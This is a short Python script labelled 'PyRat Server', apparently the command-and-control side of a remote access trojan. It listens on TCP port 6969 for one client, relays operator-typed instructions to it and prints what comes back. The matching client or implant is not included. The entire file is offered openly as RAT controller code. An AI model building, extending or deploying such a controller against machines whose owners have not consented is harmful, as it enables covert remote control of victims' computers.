#imports
import socket
import os
import sys

#Variables
port = 6969

#Functions

def clear():
    os.system('cls' if os.name=='nt' else 'clear')

#Starting Server
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
remote_ip = socket.gethostbyname( host )
serversocket.bind(('0.0.0.0', 6969))
print(host)
print(remote_ip)
serversocket.listen(1)


print("-:-:-:-:-:PyRat Server:-:-:-:-:-")
clientsocket, addr = serversocket.accept()
print("Connection from: " + str(addr))
while True:
    msgsnd = input("Your Instruction: ")

    if msgsnd == "help":
        clear()
        print("-+-+-+-+-+HELP+-+-+-+-+-")
        print("Test Connection: 'test'")

        input("\nPress ENTER to continue")
        clear()
        print("-:-:-:-:-:PyRat Server:-:-:-:-:-")
    if msgsnd == "quit":
        msgsnd = msgsnd.encode("UTF-8")
        clientsocket.send(msgsnd)
        sys.exit()

    else:
        msgsnd = msgsnd.encode("UTF-8")
        clientsocket.send(msgsnd)
        msgrcv = clientsocket.recv(4096)
        print(msgrcv.decode("UTF-8"))
